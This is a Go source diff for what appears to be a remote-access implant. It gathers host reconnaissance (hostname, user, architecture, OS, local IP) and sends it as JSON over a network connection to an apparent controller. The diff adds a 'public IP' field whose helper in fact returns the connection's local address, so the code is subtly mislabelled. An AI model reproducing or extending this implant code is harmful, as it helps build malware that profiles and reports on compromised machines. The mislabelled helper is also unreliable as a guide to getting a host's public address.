@@ -19,9 +19,10 @@ type Recon struct {
 	Arch     string `json:"arch"`
 	Kernel   string `json:"kernel"`
 	IP       string `json:"ip"`
+	PublicIP string `json:"public_ip"`
 }
 
-func gatherRecon() Recon {
+func gatherRecon(conn net.Conn) Recon {
 	hostname, _ := os.Hostname()
 	username := os.Getenv("USER")
 	if username == "" {
@@ -34,7 +35,13 @@ func gatherRecon() Recon {
 		Arch:     runtime.GOARCH,
 		Kernel:   runtime.GOOS,
 		IP:       getLocalIP(),
+		PublicIP: getPublicIP(conn),
 	}
+}
+
+func getPublicIP(conn net.Conn) string {
+	tcpAddr := conn.LocalAddr().(*net.TCPAddr)
+	return tcpAddr.IP.String()
 }
 
 func getLocalIP() string {
@@ -74,7 +81,7 @@ func main() {
 	decoder := json.NewDecoder(conn)
 
 	// Send recon
-	if err := encoder.Encode(gatherRecon()); err != nil {
+	if err := encoder.Encode(gatherRecon(conn)); err != nil {
 		fmt.Fprintf(os.Stderr, "failed to send recon: %v\n", err)
 		return
 	}
